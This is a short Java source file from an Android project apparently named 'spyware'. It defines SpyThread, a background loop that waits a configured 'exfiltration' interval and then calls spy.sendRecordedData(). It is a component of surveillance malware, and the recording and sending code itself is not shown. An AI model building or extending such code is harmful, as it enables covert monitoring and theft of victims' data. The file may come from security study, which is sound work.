package com.example.cristianturetta.spyware;

import android.util.Log;

public class SpyThread extends Thread{
    private Spy spy = Spy.getInstance();
    /**
     * If this thread was constructed using a separate
     * <code>Runnable</code> run object, then that
     * <code>Runnable</code> object's <code>run</code> method is called;
     * otherwise, this method does nothing and returns.
     * <p>
     * Subclasses of <code>Thread</code> should override this method.
     *
     * @see #start()
     * @see #stop()
     */


    @Override
    public void run() {
        Log.d("SpyThread", "Running...");
        try {
            while (true) {
                Thread.sleep(ParametersConfig.getSecondsBetweenExfiltration()*1000);
                spy.sendRecordedData();
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
